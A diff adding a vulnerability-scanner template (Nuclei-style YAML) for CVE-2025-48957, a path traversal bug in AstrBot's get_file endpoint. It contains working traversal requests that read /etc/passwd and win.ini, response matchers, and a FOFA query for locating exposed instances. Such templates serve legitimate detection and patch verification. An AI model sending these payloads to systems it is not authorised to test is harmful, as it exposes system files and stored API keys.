@@ -1,0 +1,37 @@
+id: astrbot-get_file-fileread
+info:
+  name: AstrBot get_file接口存在任意文件读取漏洞CVE-2025-48957
+  author: leadlife
+  severity: high
+  description: AstrBot是一个大型语言模型聊天机器人和开发框架。版本3.4.4至3.5.12中存在路径遍历漏洞，可能导致信息泄露，如LLM提供商的API密钥、账户密码和其他敏感数据。漏洞已在Pull Request 1676中得到解决，并包含在版本3.5.13中。作为临时解决方案，用户可以编辑cmd_config.json文件以禁用仪表板功能。但是强烈建议升级到版本v3.5.13或更高版本以完全解决此问题
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483669&idx=1&sn=dcd46f976c7d8d836eb8c7002a01efc7&chksm=9606e787a1716e91a1c96fcaf65f848bb298620b06fbebbc9ab1f758b43d90564d157112b0b6&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: CVE-2025-48957
+  metadata:
+    verified: true
+    fofa-query: title="AstrBot" || icon_hash="1513884267"
+    tips:
+    repair:
+    version:
+  tags: fileread,astrbot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/chat/get_file?filename=../../../../../../../etc/passwd"
+      - "{{BaseURL}}/api/chat/get_file?filename=../../../../../../../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
